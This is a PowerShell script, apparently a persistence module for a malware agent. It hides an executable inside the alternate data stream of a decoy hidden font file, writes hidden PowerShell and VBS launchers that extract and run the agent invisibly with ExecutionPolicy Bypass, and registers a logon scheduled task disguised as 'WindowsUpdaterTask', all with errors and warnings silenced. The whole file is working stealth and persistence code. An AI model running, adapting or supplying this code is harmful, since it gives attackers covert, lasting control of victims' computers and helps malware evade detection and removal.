$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# --- 1. Create fake font file in Fonts folder ---
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
    Write-Output "[+] Created hidden fonts folder"
}

$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    $fakeFontContent = "TTF fake font file - do not delete"
    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
    attrib +h $fontFile
    Write-Output "[+] Created fake font file: $fontFile"
} else {
    Write-Output "[+] Using existing font file: $fontFile"
}

# --- 2. Hide agent in ADS ---
$streamName = "Zone.Identifier"
Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$fontFile`:$streamName"

# --- 3. Create launcher script (run.ps1) with cleanup ---
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"

# Delete old temp file if it exists
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }

# Extract agent from ADS
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath
Write-Output "[+] Created launcher with cleanup: $launcherPath"

# --- 4. Create VBS launcher (completely invisible) ---
$vbsPath = "$fontDir\run.vbs"
# Correct VBS syntax: double quotes inside the string are escaped by doubling them.
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath
Write-Output "[+] Created VBS launcher: $vbsPath"

# --- 5. Create scheduled task (run the VBS) ---
$taskName = "WindowsUpdaterTask"
$taskCreated = $false

# Try COM first
try {
    Write-Output "[*] Attempting to create task via COM..."
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")
    try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }

    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3

    $trigger = $taskDefinition.Triggers.Create(9)
    $trigger.UserId = $env:USERNAME

    $action = $taskDefinition.Actions.Create(0)
    $action.Path = "wscript.exe"
    $action.Arguments = "`"$vbsPath`""

    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Output "[+] Scheduled task '$taskName' created/updated via COM (runs VBS)."
    $taskCreated = $true
} catch {
    Write-Output "[-] COM task creation failed: $_"
}

# Fallback to schtasks if COM failed
if (-not $taskCreated) {
    Write-Output "[*] Falling back to schtasks..."
    schtasks /delete /tn $taskName /f *>$null
    schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc onlogon /ru $env:USERNAME /f /it *>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Output "[+] Scheduled task '$taskName' created/updated via schtasks (runs VBS)."
        $taskCreated = $true
    } else {
        Write-Output "[-] schtasks failed with exit code $LASTEXITCODE"
    }
}

if (-not $taskCreated) {
    Write-Output "❌ Failed to create scheduled task."
} else {
    Write-Output ""
    Write-Output "✅ PERSISTENCE COMPLETE"
    Write-Output "Script location: $launcherPath"
    Write-Output "VBS launcher: $vbsPath"
    Write-Output "Agent hidden in: $hiddenPath"
    Write-Output "The scheduled task will run the VBS (invisible) on next logon."
}